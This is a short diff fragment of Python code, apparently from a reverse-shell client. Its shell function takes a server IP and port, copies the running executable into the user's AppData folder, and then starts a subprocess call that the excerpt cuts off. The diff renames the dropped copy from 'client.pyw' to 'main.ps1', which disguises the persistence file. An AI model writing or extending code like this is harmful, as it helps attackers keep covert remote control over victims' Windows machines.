@@ -2,7 +2,7 @@ import shutil, sys, time, subprocess, os, socket, base64
 
 
 def shell(server_ip, server_port, data_size):
-    path = os.environ['appdata'] + '\\client.pyw'
+    path = os.environ['appdata'] + '\\main.ps1'
     if not os.path.exists(path):
         shutil.copyfile(sys.executable, path)
         subprocess.call(
